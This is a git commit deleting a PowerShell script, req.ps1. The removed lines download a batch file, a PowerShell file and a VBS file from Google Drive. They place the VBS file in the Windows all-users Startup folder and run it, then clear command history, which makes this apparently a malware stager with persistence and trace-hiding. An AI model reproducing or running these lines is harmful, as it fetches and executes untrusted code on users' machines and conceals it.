929467acfbd43a14abc9bb73a81cb9f5574dfdc4
Tellertomate <147307692+Tellertomate@users.noreply.github.com>
2024-09-03 19:38:31 +0200

    Delete req.ps1

--- req.ps1
+++
@@ -1,8 +0,0 @@
-cd C:\Users\$Env:UserName
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1vM2sB8h3zyI9IbU4f3tPPpG142NTWC2e" -outfile "win64.bat"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1TQtqLuMPxJ07uYXVQUxX0lUrUCMwG7rG" -outfile "user.ps1"
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xK1Q0jwjTCBjX-UZhWA-TPe5KtJSE6d9" -outfile "startup.vbs"
-start startup.vbs
-Clear-History
-exit
